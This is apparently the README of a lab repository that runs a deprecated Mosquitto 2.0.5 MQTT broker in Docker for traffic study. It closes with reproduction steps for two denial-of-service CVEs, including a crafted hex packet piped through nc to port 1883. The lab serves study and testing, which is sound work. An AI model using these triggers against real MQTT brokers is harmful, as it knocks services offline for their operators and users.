# MQTT-in-Containers
This virtual environment was created to observe and study MQTT communications, running a deprecated version of the [Mosquitto](https://mosquitto.org/) broker (version 2.0.5). There is a version with encrypted and one without encrypted traffic for you to try. We replicated two DoS attacks, namely CVE-2023-5632 and CVE-2021-34432. Further down we have included some steps on how to replicate these.

Here is a quick rundown of how to use the files in this repo:

1. We recommend you use Linux or WSL for Windows environments.
2. You need to [install Docker](https://docs.docker.com/get-started/get-docker/) to run the containers.
3. With "sudo docker compose up" you can start up all containers mentioned in the specific compose file
4. You can then capture the traffic in Wireshark for example, although finding the correct interface is not always easy.
5. The ip adresses for the encrypted setup are static, you can change it in the compose file if needed. 
6. Play around with different settings, creating your own certificates (if you dare), topics etc. 

Note: The password for any certificate file is "test"

CVE-2023-5632 <br>
This CVE works with the encrypted Broker. To trigger the exploit all you need is the following command. The ip adress is static and should work unless you changed it:<br>
openssl s_client -connect 172.23.0.2:8883<br>
It might be beneficial to limit the number of cpu cores of your testing enviroment. For WSL this can be done in the WSL settings.<br>
CVE-2021-34432<br>
This command only works with the unencrypted broker and if allow_anonymous is set to true in the mosquitto.conf file. But could also be replicated for the encrypted broker if you are able to sucessfully authenticate a package with topic length 0.<br>
´´´echo 102b00044d5154540500003c0822000a110000000f00166d7174746f6f6c732d383739363736313532303132393d0900000621000a220005e000 | xxd -p -r | nc localhost 1883´´´

